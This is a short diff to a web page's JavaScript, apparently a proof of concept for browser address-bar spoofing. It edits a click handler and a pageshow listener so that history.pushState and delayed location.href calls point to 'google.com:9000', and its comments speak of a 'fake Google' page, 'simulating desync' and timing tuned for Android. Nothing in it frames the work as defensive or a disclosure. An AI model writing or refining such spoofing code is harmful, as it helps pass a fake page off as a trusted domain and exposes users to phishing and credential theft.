@@ -48,21 +48,22 @@ const trigger = document.getElementById('trigger');
 const message = document.getElementById('message');
 
 trigger.onclick = () => {
-  // Directly change the URL to the fake Google page
-  history.pushState({}, '', 'http://example.com:9000');  // Ganti ke URL yang diinginkan
+  // Manipulate the history state and simulate redirect to fake Google
+  history.pushState({}, '', 'http://google.com:9000');  // URL with port
+
   message.style.display = 'block';
 
-  // Delay for 500ms before changing the URL
+  // Delay redirect to make sure it's processed correctly
   setTimeout(() => {
-    location.href = 'http://example.com:9000';  // URL dengan port
-  }, 500); // Increased delay for better timing on Android
+    location.href = 'http://google.com:9000';  // Redirect to Google with port 9000
+  }, 500); // Adjust delay as needed
 };
 
 // Trigger navigation after the page is shown (simulating desync)
 window.addEventListener('pageshow', () => {
   setTimeout(() => {
-    location.href = 'http://example.com:9000';  // Ganti ke URL yang diinginkan
-  }, 500); // Added delay for Android compatibility
+    location.href = 'http://google.com:9000';  // Direct to Google with port
+  }, 500); // Increased delay for consistency
 });
 </script>
 
